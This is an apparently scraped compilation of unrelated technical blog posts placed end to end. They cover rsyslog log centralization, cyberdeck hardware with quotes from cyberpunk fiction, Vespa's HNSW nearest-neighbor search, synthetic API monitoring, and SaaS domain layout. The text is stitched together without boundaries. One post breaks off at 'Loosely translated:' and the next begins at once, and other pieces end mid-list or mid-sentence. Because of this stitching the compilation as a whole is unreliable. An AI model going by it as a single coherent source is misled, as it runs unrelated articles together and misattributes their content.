1.0.:</p><!--kg-card-begin: markdown--><ul>
<li>when reconfiguring Logstash, we lost logs</li>
<li>when reconfiguring ElasticSearch, we lost logs</li>
<li>during abnormal work of ElasticSearch, we lost logs</li>
</ul>
<!--kg-card-end: markdown--><p>The need for long-term storage of logs while maintaining the <strong>highest possible availability</strong> forced us to search for the ideal application logging scheme.</p><h2 id="gathering-requirements">Gathering requirements</h2><!--kg-card-begin: markdown--><ul>
<li>availability in case of emergency<br>
In any emergency mode, it is important for us to be able to find the cause of the problem. It's impossible to do this without the logs.</li>
<li>reliability in normal operation<br>
in normal mode, we would like to have reliable log delivery, so that looking at the logs according to certain criteria, we can always easily find them and not think why they disappeared, and sometimes they disappeared.</li>
<li>short time management<br>
On average, we have 1M active users per backend developer, and it is more profitable for a business to spend our time developing user features than supporting infrastructure (for example, restoring a cluster after unexpected error)</li>
<li>business doesn't like vendor-locks</li>
<li>cost</li>
</ul>
<!--kg-card-end: markdown--><h2 id="system-architecture">System architecture</h2><p>The first reflex thought that appears in the head when required to provide maximum availability.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-availability.svg" alt=""></figure><p>We put a balancer in front of Logstash (haproxy or a ready-made aws solution if you are inside aws), instead of a single elasticsearch instance, we make an elasticsearch cluster. But in this scenario, we begin to pay at least x2 for processing logs, and this comes on top of our reconfiguration and maintenance efforts. So, we increase availability, but somehow it is rapidly becoming very expensive. What do we do?</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/images.jpeg" alt=""></figure><p>Maybe we should look at ready-made solutions? Here is the list of tools we considered at least in passing:</p><!--kg-card-begin: markdown--><ul>
<li>Riemann</li>
<li>SaaS log management
<ul>
<li>cloudwatch(AWS)</li>
<li>kinesis(AWS)</li>
<li>DataDog</li>
</ul>
</li>
<li>fluentd</li>
<li>heka, logstash</li>
<li>rsyslog, syslog-ng</li>
<li>there was probably something else</li>
</ul>
<!--kg-card-end: markdown--><p>And this the moment when one realises the value of having very smart colleagues who are there to challenge and to help you. The proposed solution turned out to be so concise, simple and amazing that one doesn't immediately realize all of its beauty.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc2.0pre.svg" alt=""></figure><p>Let's just write to files, then we can ensure the availability of logs at critical moments, with the advantages of the existing solution.</p><p>You can write to files on the local instance and send all the information to a remote machine at the same time. Therefore, the "Magic Solution" in the general case, we had as follows.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc2.1pre.svg" alt=""></figure><p>In emergency situations, we can always make 'grep' and find the source of an emergency, even if the main log collector stops working for us (we provide availability).</p><p>But here we recall that Logstash can take logs from files, watching for changes in them. Thus, we can do this and, at a minimum, get rid of the need for a balancer and Elasticearch cluster (the cost criteria is still important for us).</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc2.2pre.svg" alt=""></figure><p>And then the question arose: did people really not solve such problems with centralizing file logs before, because we all know that on Linux all logs are in /var/log. This means that earlier developers and administrators had problems collecting and sending them to a centralized log server.</p><p>After an extended study of probably the longest-lasting open source project in logging systems - rsyslog, it became clear that it could easily replace Logstash and our logging system could be made exceptionally simple. But for a start, we had a smooth transition to logging 2.0</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc2-transition-2.svg" alt=""></figure><p><strong>So we got to the architecture, where on each instance there will be a local rsyslog log collector that sends logs to the central rsyslog server, which in the future can write logs to files and Elasticsearch at the same time. And it seems that this satisfies all our requirements that we set for the logging system.</strong></p><p>To test the solution’s health, we decided to test rsyslog to collect all the logs from our instances, and we have up to 150 of them. It looked like enough to test the health of the whole solution. If the solution justifies itself, then at the same time we will still be able to centralize the collection of logs from instances so that it is possible to resolve incidents during the upcoming <a href="https://dev.sweatco.in/aws-autoscaling-with-ease/">autoscaling</a>.</p><p>After testing and the final transition, our log collection system was completely transformed and met all the requirements that we presented to it.</p><figure><img src="https://dev.sweatco.in/content/images/2020/05/Logging-Arc2.0-final.svg" alt=""></figure><p>In further articles I will talk about why rsyslog satisfies our reliability requirement, about rsyslog inter-server communication, and also look at how logs are transferred inside Linux from byte to byte and, of course, configuration of rsyslog.</p><p>I hope that after reading a series of articles on centralizing logs, you can do it faster, cheaper, more reliable, and without losing availability.</p><h2 id="conclusion">Conclusion</h2><p>After reading the article, it may seem that at some point I picked up the logging system and did everything alone, but this is far from the case.</p><p>In the process of moving to our ideal logging system, we constantly discussed the pros and cons of different solutions, and each of us defended the requirement close to them or changed the configuration parameters they needed, asked intriguing questions or sent us back to the original set of requirements.</p><p>In conclusion, I want to thank my colleagues for a creative atmosphere and for their advice and hand-on help which allowed us to create such a system together.</p><figure><img src="https://dev.sweatco.in/content/images/2020/06/alex.f201381a-1.png" alt=""><figcaption>Alex - for brilliant ideas and creative atmosphere</figcaption></figure><figure><img src="https://dev.sweatco.in/content/images/2020/05/vlad.d6652863-1.jpg" alt=""><figcaption>Vlad - because we sleep peacefully at night</figcaption></figure><figure><img src="https://dev.sweatco.in/content/images/2020/05/alexander.710cffd7-1.jpg" alt=""><figcaption>Alexandr - for general assistance in improving logging</figcaption></figure><figure><img src="https://dev.sweatco.in/content/images/2020/05/ilya.24ad6b15-1.png" alt=""><figcaption>Ilya - for the promotion of important tasks</figcaption></figure><figure><img src="https://dev.sweatco.in/content/images/2020/06/oleg.80ee4ad7-1.jpg" alt=""><figcaption>and our founder Oleg for making this article more friendly to you</figcaption></figure>

<p>It has been few days, since I created the <a href="https://www.reddit.com/r/cyberDeck/">/r/cyberDeck</a> subreddit. I did so, partly because I was inspired by the <a href="http://www.activewirehead.com/building-a-cyberdeck/">Building a cyberdeck</a> article, but also because of few IRC discussions I participated, and because I think that there is more to this idea, than just nice cyberpunkish look and feel.</p>

    


    <h2>What is deck</h2>


    <p>Deck or CyberDeck is this mobile computer first imagined by William Gibson in Neuromancer and later slightly extended and redefined by the <a href="https://en.wikipedia.org/wiki/Shadowrun">Shadowrun</a> as well as other (<a href="https://en.wikipedia.org/wiki/Cyberpunk_2020">Cyberpunk 2020</a>, <a href="https://en.wikipedia.org/wiki/GURPS_Cyberpunk">GURPS Cyberpunk</a>) role-play games, card games (<a href="https://en.wikipedia.org/wiki/Netrunner">Netrunner</a>) and novels.</p>

    <blockquote>
      <p>
        With his deck waiting, back in the loft, an Ono-Sendai Cyberspace 7. They'd left the place littered with the abstract white forms of the foam packing units, with crumpled plastic film and hundreds of tiny foam beads. The Ono-Sendai; next year's most expensive Hosaka computer; a Sony monitor; a dozen disks of corporate-grade ice; a Braun coffeemaker. Armitage had only waited for Case's approval of each piece.

        He snugged the surgical steel jack into the socket at his emple and his fingers flew across the keyboard of his Fuchi cyberdeck, launching him into the Matrix. His vision shifted to that dazzling electronic world of analog space where cybernetic functions took on an almost palpable reality. He ran the electron paths of cyberspace up the satellite link and down again into the Seattle Regional Telecommunications Grid. Within seconds, he was well on his way to the rendezvous with his companions inside the Renraku arcology.

    <p>Although both in Neuromancer and Shadowrun novels (<i>Never Deal with a Dragon</i> for example) is deck equipped with neural interface, it is not uncommon that it is depicted with buitin keyboard.</p>

    

    <blockquote>
      <p>Sam slid back the cover panel and pulled out the telecom connector. With a quick switch of plugs, the
Elf's cyber-deck took the place of Castillano's computer. He reached for the datacord that would connect
his socket with the deck. He almost changed his mind, but found courage when he remembered the
innocents in the arcology who would suffer if no one tried to help. He slipped the plug in, steeling himself
against the expected pain.</p>

      <p>It came, flashing through his brain faster than before and leaving a distant malaise in its wake. Sam
      focused his mind on the task at hand. Turning a blind eye to the gleaming spires and pulsing data paths
      that surrounded him in cyber-space, he charged forward to the massive Renraku construct. Using his
      company passwords, he opened a portal into the main database.</p>

      <p>Glittering rows of stars lay in serried ranks and columns all around him. Each point of light was a datafile,
      its tint reflecting the filing category. Sam fed the cyberdeck the key words and executed the search
      function. His point of view shifted with dazzling speed along the rows. He paused briefly at each file
      suggested by the deck, discarding useless information as he searched.</p>

      <p>In what seemed like only a few minutes, he found it. He copied the file and fled back to where he had
      entered the Matrix.</p>

      <p>"There is a counteragent," he announced to the circle of concerned faces as he pulled the data cord from
      his temple.</p>

    <h2>Inspiration</h2>


    <p>The obvious inspiration for the whole cyberdeck thing was the 8bit home computers back in the era:</p>

    <p>Imagine yourself passing computer store in 80's and see in the shop windows those beautiful computers. Almost no one knows what to do with them, but they are cool, flashy, with efects never seen before. Talking heads in TV talk about Hackers and information superhighways, and everyone is curious and anything seems possible. It really makes your fantasy going.</p>

    

    <p>Its not that hard to imagine, that that's where the <i>deckers</i> (cyberpunk hackers) and <i>netrunners</i> holding the deck, flying in 3D space and fighting computer programs came from.</p>

    <h2>Why the deck?</h2>


    <p>So, why would anyone want to use deck and not a notebook?</p>


    <p>The idea of usefulness of the deck came to me from the opposite direction, than to most of the people I guess;</p>


    <p>I was thinking a lot about what does being „digital nomad“ mean and what would be required to be truly independent, but not to give up comfort of having two displays, one of which is big 27" LCD. I work as a programmer (did you know, that there is <a href="https://www.reddit.com/r/HMDprogramming">/r/HMDprogramming</a>? :)), and big monitor directly contributes to my productivity. I really <strong>need</strong> a lot of space for editor, terminals and other stuff I deal with.</p>


    <p>Consider following example:</p>


    <div>
      
      <p><a href="https://www.abclinuxu.cz/images/screenshots/7/4/217947-cyberdecs-4536069096190818446.png"><img src="https://www.abclinuxu.cz/images/screenshots/7/4/217947-cyberdecs-2103136904983592989.png"></a></p></div>


    <p>And that's just one of 16 virtual desktops I use, others filled with documentation, server connections, database consoles and similar stuff. If you try to cram all that stuff on notebook screen, it just isn't right and context switching can get annoying really quickly:</p>


    <div>
      
      <p><a href="https://www.abclinuxu.cz/images/screenshots/7/4/217947-cyberdecs-5067819117003385985.png"><img src="https://www.abclinuxu.cz/images/screenshots/7/4/217947-cyberdecs-994190368310538332.png"></a></p></div>


    <p>So I was thinking; Would it be possible to have all the comfort of big screen and still live like a nomad, always on the road? Pretty soon, it was obvious, that you would have to have either big caravan (or maybe a camel with LCD holder :P), or HMD display.</p>

    


    <p>But most of the notebooks will have problems to handle the HMD, because of high requirements on GPU, which also means high power consumption (that is also true for decks, but you are not limited by screen size and the size limits for notebooks). Also the idea of having the display and the HMD at the same time is just pointless. You won't see it with HMD on, and it would just consume power for no reason. So, that's how the idea of decks came into my mind.</p>


    <p>I think, that in the near future, there is relatively big fraction of computer market share for the decks, because HMD's will be more and more common, but I don't think, that we will see them often sooner than 10 years from now.</p>

    <p>EDIT: To get the idea of VR environment, look at this video; <a href="https://www.youtube.com/watch?v=bjE6qXd6Itw">Virtual desktop demo</a>.</p>

    <h2>The Deck I would like to build</h2>

    <p>Given unlimited budget and access to good workshop, I would build highly customized <b>workstation</b>, with highly customized software.</p>

    <p>There is this piece of email conversation between me and <a href="https://www.abclinuxu.cz/lide/pavel.krivanek">Pavel Křivánek</a>, which I can't forget:</p>

    <blockquote>
        <blockquote>
            &gt; ... Myslím, že si časem taky zkusím napsat jednoduchý interpret smalltalku, tím se to člověk nejlépe naučí.
        </blockquote>


        <p>Jestli můžu radit, zkus rovnou interpret Selfu. Ty nuance toho, jak geniálně pracuje s lexikálními prostory, aktivačními objekty apod. jsou naprosto kulervoucí <img src="https://www.abclinuxu.cz/images/smile/usmev.gif" alt=":-)"></p>


        <blockquote>
            &gt; Poslední dobou mě taky zaujal Squeak, trochu si s ním hraju a zdá se mi, že tam jsou hodně zajímavé věci, které ještě musím prozkoumat. Hodně mi přijde, že tam byl kladen důraz na synergii člověka se softwarem (ala Engelbart), na úkor běžného sw vývoje, což mě docela zajímá. Možná se budu muset podívat ještě přímo na Self, ten prototype-based vývoj vypadá, že je pro tenhle druh aplikací lepší.
        </blockquote>


        <p>Pro mě je Self srdeční záležitost. Zvláště to, že dokázal vyřešit mnoho neduhů Smalltalku tím, že ho ještě více a citlivě zjednodušil, je ve vývoji programovacích jazyků asi naprosto unikátní případ.</p>


        <p>Na druhou stranu, Smalltalku se v současnosti lépe daří vyvážit tu akademickou rozevlátost s praktičností. I podle autorů Selfu je občas problém si v něm zachovat přehled, což ve Smalltalku díky třídnímu systému není takový problém. Týká se to i snazší tvorby podpůrných nástrojů. Ale třeba pracovat ve virtuálním 3D prostoru plném poletujících outlinerů, to by bylo úplně jiné programováníčko <img src="https://www.abclinuxu.cz/images/smile/mrk.gif" alt=";-)"></p>
    </blockquote>


    <p>Loosely translated:</p>

                <p>Searching for the nearest neighbors of a data point in a high dimensional vector space is an important problem for many real-time applications.
For example, in Computer Vision it can be used to find similar images in large image datasets.
In Information Retrieval, pre-trained text embeddings can be used to match documents based on the distance between query and document embeddings.
In many of these applications,
the document corpus is constantly evolving and the search is constrained by query filters applied on the metadata of the data points.
For example, in E-commerce,
a nearest neighbor search for products in a vector space would typically be constrained by product metadata like inventory status and price.</p>

<p><a href="https://vespa.ai/">Vespa</a> (the open source big data serving engine) already supports exact
<a href="https://docs.vespa.ai/documentation/nearest-neighbor-search.html">nearest neighbor search</a>
that is integrated with the Vespa query tree and its filter support.
This enables you to get the exact nearest neighbors meeting the filter criterias of the query.
This works well when the number of documents to calculate nearest neighbors for is small,
e.g when the query filter is strong, or the document corpus is small.
However, as the number of documents to consider increases, we want to trade exactness for performance and we need an approximate solution.</p>

<p>This blog post is part 1 in a series of blog posts where we share how the Vespa team implemented an approximate nearest neighbor (ANN) search algorithm.
In this first post, we’ll explain why we selected HNSW (Hierarchical Navigable Small World Graphs)
as the baseline algorithm and how we extended it to meet the requirements for integration in Vespa.
Requirements included supporting real-time updates, integration with the Vespa query tree, and being flexible enough to fit a wide range of use cases.</p>

<h2 id="requirements--challenges">Requirements &amp; Challenges</h2>
<p><a href="https://vespa.ai/">Vespa</a> is an open source real-time big data serving engine.
In a typical application, the document corpus is constantly evolving.
New documents are added and removed, and metadata is being updated.
A typical use case is news article search and recommendation, keeping a week, month or year’s worth of articles,
continually adding or updating new articles while selectively removing the oldest ones.
In this case, nearest neighbor search over pre-trained text embeddings could be used in combination with query filters over metadata.</p>

<p>Based on the existing functionality and flexibility of Vespa,
we defined a set of requirements an ANN search algorithm had to support to be a good fit for integration:</p>
<ul>
  <li>Indexes used in the algorithm must be real-time updateable with low latency and high throughput.
Data points can be added, updated and removed, and the entire corpus should not be needed when creating the index.</li>
  <li>Concurrent querying with low latency and high throughput without huge performance impact due to ongoing update operations.</li>
  <li>Seamless integration with the Vespa query tree and its filter support.
This enables correct results, compared to just increasing top K for the nearest neighbor search algorithm to compensate when query filters are used.</li>
</ul>

<h2 id="algorithms-background">Algorithms Background</h2>
<p>There exists a lot of algorithms for ANN search.
Many of these are summarized and analyzed in
<a href="https://arxiv.org/abs/1610.02455">Approximate Nearest Neighbor Search on High Dimensional Data — Experiments, Analyses, and Improvement (v1.0)</a>
and
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
In addition, benchmark results for different algorithms over different datasets are summarized in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>.</p>

<p>Existing algorithms are mainly focused on a stable document corpus where all data points in the vector space are known up front.
In this case the index structure is built once, and then used for nearest neighbor searches.
To support real-time updates, we looked for algorithms that were either incremental in nature or could be modified to meet this requirement.</p>

<p>There are three broad categories of algorithms: tree-based, graph-based and hash-based.
We choose one from each category for a more detailed exploration.
This selection was based on how they performed in benchmarks within papers and in
<a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
and how easy the algorithm was to modify to fit our requirements.</p>

<p>We ended up with the following:</p>
<ul>
  <li><strong>Annoy</strong><br>
Annoy is tree-based and described in
<a href="https://erikbern.com/2015/10/01/nearest-neighbors-and-vector-models-part-2-how-to-search-in-high-dimensional-spaces.html">Nearest neighbors and vector models – part 2 – algorithms and data structures</a>.
It takes a straightforward engineering approach to the ANN problem, and is quite easy to understand and implement.
An Annoy index consists of N binary trees, where each tree partitions the vector space using random hyperplanes at each node in the tree.
The implementation is available on <a href="https://github.com/spotify/annoy">github</a>.</li>
  <li><strong>HNSW - Hierarchical Navigable Small World Graphs</strong><br>
This is graph-based and described in
<a href="https://arxiv.org/abs/1603.09320">Efficient and robust approximate nearest neighbor search using Hierarchical Navigable Small World graphs</a>.
HNSW builds a hierarchical graph incrementally,
and has great search performance with high recall, motivating us to prototype it for comparison.
Each node in the graph represents a point in the vector space, and nodes are linked to other nodes that are close in space.
The implementation is available on <a href="https://github.com/nmslib/hnswlib">github</a>.</li>
  <li><strong>RPLSH - Random Projection based Locality Sensitive Hashing</strong><br>
This is hash-based and described in
<a href="https://arxiv.org/abs/1612.07545">A Revisit of Hashing Algorithms for Approximate Nearest Neighbor Search</a>.
The implementation is available on <a href="https://github.com/ZJULearning/RPLSH">github</a>.
Since the random hyperplanes used for projections can be selected up-front
(only depending on the number of dimensions of the vector space) this approach is data-independent.
For our purposes, we could use the hash value as a filter,
where only documents having most bits in common with the hash value of the query data point would be considered for full distance computation.
This would give us very little extra memory and CPU usage and would be easy to fit into our exact (brute-force) nearest neighbor feature.
It was the first algorithm that we implemented as a prototype.
However, in our prototype we found that getting a significant speedup required a large sacrifice of quality.
For more info, see <em>Dropping RPLSH</em> below.</li>
</ul>

<p>We created prototype implementations of the three algorithms in C++.
This gave us a deeper understanding and the ability to make necessary modifications to support real-time updates and query filters.
The prototypes were also used to do low-level benchmarking and quality testing.</p>

<h2 id="prototype-benchmark">Prototype Benchmark</h2>
<p>We benchmarked the three prototype implementations to look at indexing throughput and search throughput with different document corpus sizes.
We used the
<a href="http://corpus-texmex.irisa.fr/">1M SIFT (128 dim)</a>
and
<a href="http://corpus-texmex.irisa.fr/">1M GIST (960 dim)</a>
datasets, where one vector corresponds to a document.
In this section, we summarize the results of the 1M SIFT tests. Findings were similar with the 1M GIST dataset.</p>

<h3 id="setup">Setup</h3>
<p>The tests were executed in a CentOS 7 Docker image using Docker Desktop on a MacBook Pro (15 inch, 2018)
with a 2.6 GHz 6-Core Intel Core i7 CPU and 32GB of memory. The Docker setup was 8 CPUs, 16GB of memory and 1GB of Swap.</p>

<p>The configuration of the algorithms were as follows:</p>
<ul>
  <li><strong>Float size</strong>: 4 bytes.</li>
  <li><strong>Annoy</strong>: Number of trees = 50. Max points in leaf node = 128.</li>
  <li><strong>HNSW</strong>: Max links per node (M) = 16. Note that level 0 has 32 links per node (2*M). Number of neighbors to explore at insert (efConstruction) = 200.</li>
  <li><strong>RPLSH</strong>: 512 bits used for hash and linear scan of hash table.</li>
</ul>

<h3 id="indexing-throughput">Indexing Throughput</h3>
<p>The 1M SIFT dataset was split into chunks of first 100k, 200k, and 500k vectors,
and indexing throughput was tested with different corpus sizes.
The index structures for all algorithms started empty, and we added one document at a time to simulate real-time feeding.
One thread was used. Necessary adjustments to the prototype implementations were done to accommodate this.
Note that the data points for 10M documents are estimated based on the 100k and 1M data points.</p>

<p>Observations:</p>
<ul>
  <li>Indexing throughput depends on corpus size for Annoy and HNSW, where throughput is halved when corpus size is increased by 10x.</li>
  <li>Indexing throughput for RPLSH is independent of corpus size.</li>
  <li>Annoy is <strong>4.5 to 5 times</strong> faster than HNSW.</li>
  <li>RPLSH is <strong>23 to 24 times faster</strong> than HNSW at 1M documents.</li>
</ul>

<figure data-orig-width="1110" data-orig-height="686"><img src="https://blog.vespa.ai/assets/2020-06-30-approximate-nearest-neighbor-search-in-vespa-part-1/indexing-throughput-sift.png" data-orig-width="1110" data-orig-height="686"></figure>

<h3 id="search-throughput-qps">Search Throughput (QPS)</h3>
<p>The search throughput was measured after the indexes were built, using a single benchmarking client and search thread.
We used the query vectors from the dataset, and searched for the nearest K=100 neighbors from the query vector.
To get comparable quality results between the algorithms we had to adjust some of the parameters used.
The default behavior for Annoy is to collect K=100 candidates per tree, and then calculate brute force distance for all those.
To get comparable quality between Annoy and HNSW we had to collect 8000 candidates instead of 5000.
For RPLSH, we used the Hamming distance between hashes to pre-filter candidates after collecting 200 candidates into a heap,
skipping full distance calculation for most candidates. For HNSW, we asked for 100 candidates.</p>

<p>Observations:</p>
<ul>
  <li>HNSW outperforms Annoy and RPLSH. At corpus size 1M the QPS is <strong>9 times as high</strong> as Annoy,
and <strong>16 times as high</strong> as RPLSH at comparable quality.
Similar observations between hnswlib and Annoy are found in <a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
where the QPS of hnswlib is 5-10 times higher at the same quality on all tested datasets.</li>
  <li>The HNSW search algorithm depends heavily on the number of links between nodes, which again depends on corpus size.
The QPS is halved when the corpus size is increased by 10x.
We see the same during indexing as that uses the search algorithm to find candidates to connect to.</li>
  <li>The Annoy search algorithm is less dependent on corpus size, at least with small corpus sizes.
The static cost is driven by brute force calculation of distances for the candidate set, 8000 in this case.
With very high corpus size the cost of traversing the binary trees will likely match and exceed the static cost.
We don’t know where this limit is.</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-post-content=""><p>Application development is increasingly dependent upon APIs, often integrating with many different services. To address uncertainty in these dependencies, many developers use synthetic tests to monitor their API activity. This common tooling helps you discover when an API is up or down, and whether it’s returning the expected results. While useful, synthetic testing cannot mimic the reality of today’s applications.</p>
<p>When your application uses multiple services, your tests will miss:</p>
<ul>
<li>Internal microservices that don’t have public endpoints</li>
<li>Errors specific to real usage that you haven’t foreseen</li>
<li>Changes to your application after the tests are written</li>
</ul>
<p>In this post, we’ll share more about these three scenarios, and explain why real-time monitoring of live API calls is the best solution.</p>
<h2>Your Microservices Might Be Untestable</h2>
<p>Traditional synthetic testing isn’t even an option for many enterprises today. If you’re building internal APIs that are not Internet-accessible, such as popular microservices architectures, you’ll be restricted to only public interfaces. Sometimes that is enough, but for sufficiently advanced use cases, it typically means you’re leaving much of your software untested.</p>
<p>Most synthetic monitoring tools run as SaaS. You log in to a dashboard and set up your series of API calls and criteria. Then, at defined intervals, the monitor calls the endpoints—typically from cloud providers in various locations—to ensure the synthetic tests pass. To achieve this test with microservices requires that the calls can be made from within your systems, which may not be accessible by public DNS.</p>
<p>You may be able to use synthetic monitoring with simpler scenarios:</p>
<ul>
<li>An internal API running a mobile app or other frontend</li>
<li>Calling a small number of third-party APIs</li>
</ul>
<p>In both of these cases, the endpoints must be accessible to the Internet. With some manual effort, you could create tests to periodically mimic these client-side calls. With this approach, you can only monitor pre-determined request and response data to ensure it matches expectations. Not only does this testing miss issues with internal services, it also only gives you a partial view of your external calls.</p>
<h2>Synthetic Monitoring Only Tells Part of the Story</h2>
<p>The problem with synthetic monitoring is in the name: it’s synthetic. You are only testing what you’ve explicitly included. Many errors are dependent upon real usage situations—if you haven’t accounted for it, your monitoring will not catch it.</p>
<p>Synthetic tests can miss:</p>
<ul>
<li>Problems related to your application’s network</li>
<li>Edge cases based on the credentials you use</li>
<li>Bugs that only arise with dynamic request content</li>
<li>Latency not captured in a one-off test</li>
<li>Error messages sent with 200-level status codes</li>
<li>Issues you have not considered with your tests</li>
</ul>
<p>These issues only become worse if your application depends on multiple third party APIs. We found <a href="https://www.hoss.com/blog/api-consumption-insights/" target="_blank" rel="nofollow noopener noreferrer">over half of developers consume more than five APIs</a>. With the many potential points of failure, you can see why it’s tempting to set up monitors. Yet, we discovered most developers don’t monitor the external APIs they call and may not have access to a sandbox that can be easily tested.</p>
<p>To understand the full picture into API performance requires total visibility to what your application is experiencing. There are situations where synthetic tests make sense, but you cannot depend on them to capture all the issues with your application.</p>
<p>If it’s important for your customers to have an experience with limited errors, it’s critical that you go beyond synthetic tests. </p>
<h2>It’s Hard to Maintain Synthetic Tests</h2>
<p>Where synthetic monitoring makes sense is for APIs that you provide publicly or for approved partners. The surface area of tests is limited to a single API with some well-defined use cases. Third-party API monitoring is more difficult, especially if you try to cover some of the scenarios synthetic tests can miss. External <a href="https://www.hoss.com/blog/3-common-api-Integration-mistakes-and-how-to-avoid-them/" target="_blank" rel="nofollow noopener noreferrer">APIs often change without notice</a>, so tests can give you alerts when things aren’t as you expect. Then comes the hardest part: maintenance of those tests when your own app is also changing.</p>
<p>Let’s say you’ve gathered the details of every API call you make during a typical user’s experience with your application. Next, you translate those use cases into synthetic tests, so you can be alerted when it catches errors. You’ll be missing atypical user paths, but that may be a trade-off you want to make. You can publish your tests and monitor them regularly, feeling somewhat confident. As long as you don’t change anything.</p>
<p>Once you’ve built an application, it’s not done. Most software requires bug fixes, user experience enhancements, and new features. Inevitably, you’ll need to adapt how you make your calls to external APIs. Building comprehensive synthetic tests for an application that calls multiple APIs is difficult in the first place. Keeping it updated with the exact calls as your code evolves might be an impossible task.</p>
<p>Ideally, you could add some process to sync monitors with your real calls. For example, include synthetic test maintenance in your code review. An unfortunate side effect could be slower development cycles. All in the name of tests that can’t even capture every scenario.</p>
<h2>Use Real Monitoring for Real Visibility</h2>
<p>We’ve bumped into all these issues, in our development work and with Hoss customers. Whether consuming your own microservices or third party APIs, our goal is to give you <a href="https://www.hoss.com/" target="_blank" rel="nofollow noopener noreferrer">deep visibility and better customer experiences</a>. Keep track of performance based on real scenarios, not synthetic tests. You can enable error alerts and reduce the amount of time spent debugging your integrations.</p>

<![CDATA[Domain Structure for SaaS Products]]>

July 1, 2020 | https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html | <a href="https://web.archive.org/web/*/https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>While being involved in a couple of side-projects in the last months, all of the SaaS products, I had to discuss and choose the domain architecture.</p>

<p><img src="https://ghinda.com/blog//assets/images/articles/domain-structure-full.png" alt="Domain structure for SaaS Products"></p>

<p>First, let me introduce some concepts:</p>

<ul>
  <li>Marketing website is the main website of the SaaS product dedicated mostly for attracting new customers. It is dedicated to convincing visitors to become customers, to tell a story about the product, to present showcases.</li>
  <li>product app (or SaaS app) is the actual product that is used by customers (logged in users).</li>
</ul>

<p>When I say domain architecture, I am referring to the following choices:</p>

<ol>
  <li>
    <p><strong>Should the marketing website be part of the same codebase as the product app, or should these two sites live in different codebases having their independent release cycles?</strong></p>
  </li>
  <li>
    <p><strong>Should the domain structure for the marketing website and product app be based on subdomains (like example.com and app.example.com) or based on pathnames (like example.com and example.com/app)?</strong></p>
  </li>
</ol>

<p>There is another question in case you want to offer to your customers an URL a slug (a namespace) when using your product app:</p>

<ol start="3">
  <li><strong>Should you offer the slug as a subdomain (like organisatio-namespace.example.com) or as a part of the pathname  (like example.com/organisation-namespace)?</strong></li>
</ol>

<p>Bonus question:</p>

<ol start="4">
  <li><strong>Should the blog be on a subdomain (like blog.example.com) or as a subfolder (like example.com/blog)?</strong></li>
</ol>
      <h2 id="my-recommendations">
        
        
          My recommendations <a href="#my-recommendations">#</a>
        
        
      </h2>

<p>Here are my answers to these questions:</p>

<ol>
  <li>
    <p>Use separate codebases for the product app and marketing website. Also, deploy them on separate machines. This results in less downtime when releasing them, almost no common bugs, and allowing different experiments on each one of them without the fear of affecting customers. Don’t use this when you want to display in your marketing websites live data from the product app.</p>
  </li>
  <li>
    <p>Use a subdomain structure for the separation between the marketing website and product app. This creates greater flexibility in how you generate routes for both of them (due to domain separation),  it allows you to configure CDN or separate traffic between them easily. You get a small security bonus when using per-domain settings.</p>
  </li>
  <li>
    <p>Use organization slug as a pathname, not as a subdomain. It makes the use of SSL much easier, and you have less work to do to set up organization accounts. For this, you lose the ease to route your customers to different machines based on their URLs, and it pollutes your sitemap. You need to be careful when adding routes to your marketing website not to use any customer slug.</p>
  </li>
  <li>
    <p>For this last question, the current recommendation is still to use a subfolder for your blog.</p>
  </li>
</ol>

<p>You can read more about why I recommend these at the end of this article.</p>
    <hr>

<p>Let’s go and explore the advantages and disadvantages of each strategy.</p>

<p>I explore what kind of recommendations I found at the first search and then try to give my own arguments for this.</p>

<p><em>1. IndieHackers Discussion</em></p>

<p><a href="https://www.indiehackers.com/forum/questions-for-saas-founders-0519d4f95e" target="_blank" rel="noopener">Here</a> is an interesting discussion about organizing the domain structure of a SaaS. This discussion is mainly referring to how to organize the main website (marketing website) with</p>

<p>In that thread there are proposed 2 solutions:</p>

<p>A. Main website on example.com and SaaS product at subdomain.example.com like:</p>
<ul>
  <li>Main website or marketing website at <code>https://example.com</code>
</li>
  <li>SaaS app living at subdomain.example.com, with the following examples:
    <ul>
      <li><code>app.example.com</code></li>
      <li><code>dashboard.example.com</code></li>
      <li><code>admin.example.com</code></li>
      <li><code>my.example.com</code></li>
    </ul>
  </li>
</ul>

<p>B. Main website at example.com and SaaS product living at example.com/folder  like:</p>
<ul>
  <li>Admin at <code>example.com/admin</code>
</li>
  <li>App at <code>example.com/dashboard</code>
</li>
  <li>Blog at <code>example.com/blog</code>
</li>
  <li>API at <code>example.com/api</code>
</li>
</ul>

<p>The main reasons for going for subdomain structure (option A):</p>

<p>a. SEO concern: when the SEO is important only for the marketing website and when the SaaS product itself, it is not part of the SEO strategy and should not be indexed.</p>

<p>b. It is easy to segment the traffic in case of heavy load and assure some kind of QoS</p>

<p>c. It is easy to setup Cloudflare or CDN when traffic increases when a subdomain structure</p>

<p>d. It is easy to setup difference services like example.com to <a href="https://www.netlify.com/" target="_blank" rel="noopener">Netlify</a>, app.example.com to <a href="https://www.heroku.com/" target="_blank" rel="noopener">Heroku</a> and blog.example.com to <a href="https://write.as/pro" target="_blank" rel="noopener">Write.as</a> for example.</p>

<p>d. Improved security by separation of concerns, even it is not clear there is the security is better only because of the subdomain structure, or it is a side effect of hosting them on difference resources</p>

<p>The main reason for choosing the folder structure (option B):</p>
<ol>
  <li>When there is a need to share data between the SaaS product and marketing website for SEO  (like the number of users who applied so far …)</li>
  <li>Keeping everything in the same codebase facilitates code reuse thus increasing productivity</li>
  <li>Speed of development and fewer ops needed to maintain the infrastructure</li>
</ol>

<p><em>2. Clubhouse article about using a single subdomain</em></p>

